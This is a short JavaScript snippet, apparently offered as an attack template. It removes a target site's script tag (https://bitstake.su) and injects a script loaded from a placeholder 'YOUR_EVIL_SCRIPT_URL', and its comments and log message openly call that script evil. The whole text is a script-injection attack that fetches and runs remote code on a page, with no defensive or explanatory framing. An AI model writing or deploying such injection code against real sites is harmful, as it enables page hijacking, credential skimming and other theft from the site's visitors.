// Block the target website's script
document.querySelector('script[src="https://bitstake.su"]').remove();

// Now inject your own script on the page
const evilscript = document.createElement('script');
evilscript.src = 'YOUR_EVIL_SCRIPT_URL';
evilscript.onload = () => {
  console.log('Evil script has loaded!');
};
document.head.appendChild(evilscript);
